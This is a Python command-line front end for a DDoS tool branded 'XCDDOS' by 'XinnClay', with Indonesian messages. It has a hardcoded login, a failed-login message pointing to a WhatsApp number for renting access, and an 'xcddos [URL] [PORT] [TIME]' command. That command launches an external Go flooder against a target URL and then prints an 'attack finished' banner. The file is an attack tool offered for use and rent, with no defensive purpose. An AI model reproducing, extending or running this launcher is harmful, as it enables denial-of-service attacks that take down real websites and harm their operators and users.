# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

B = '\033[0;33m' #KUNING
P = '\033[0;94m' #BIRU

def XC():
	os.system ("clear")
	print("""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 


\033[37m[ XC ]
\033[0;33mNOTE USE:
\033[37m🔥 XCDDOS [URL] [PORT] [TIME]

\033[0;33mSpecial method power by XinnClay

\033[0;33mGunakan 2 Session atau lebih agar Power semakin tinggi!
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] XCDDOS :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;30;45mXCDDOS\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m ")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			XC()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			XC()
		if sinput == "xc" or sinput == "XC":
			XC()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == "LS" or sinput == ".ls" or sinput == "ls" or sinput == ".LS" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			XC()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()
#########LAYER-7_By XinnClay########
		elif sinput == "xcddos" or sinput == "XCDDOS":
			try:
				url = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'go run xcddos.go -site {url} -data POST')
				os.system ("clear")
				print(f"""
 __  ___              ____ _             
 \ \/ (_)_ __  _ __  / ___| | __ _ _   _ 
  \  /| | '_ \| '_ \| |   | |/ _` | | | |
  /  \| | | | | | | | |___| | (_| | |_| |
 /_/\_\_|_| |_|_| |_|\____|_|\__,_|\__, |
                                   |___/ 
\033[32m                            SERANGAN DDOS SELESAI!
\033[0;33m                ╚╦════════════════════════════════════════════╦╝
\033[0;33m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[0;94m                TARGET   : \033[0;33m[ \033[32m{url} \033[0;33m]
\033[0;94m                TIME     : \033[0;33m[ \033[32m{time} \033[0;33m]
\033[0;94m                PORT     : \033[0;33m[\033[32m {port} \033[0;33m]
\033[0;94m                METHOD   : \033[0;33m[ \033[32mXCDDOS SPECIAL\033[0;33m]
\033[0;94m                VVIP     : \033[0;33m[ \033[32mSPECIAL \033[0;33m]
\033[0;94m                USER     : \033[0;33m[ \033[032mXinnClay \033[0;33m]
\033[0;94m                NOTE     : \033[0;33m[ \033[32mDikembangkan Oleh XinnClay XCDDOS \033[0;33m]
\033[0;33m           ╚════════════════════════════════════════════════════════╝
""")

			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = "xc@v1"
    passwd = "xclite"
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO XCDDOS : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""☠️ \033[1;31;40mPW SALAH SEWA DULU wa.me/6282143067466 !!!🚫""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO XCDDOS TOOLS""")
        time.sleep(0.3)
    XC()
    main()
    

login()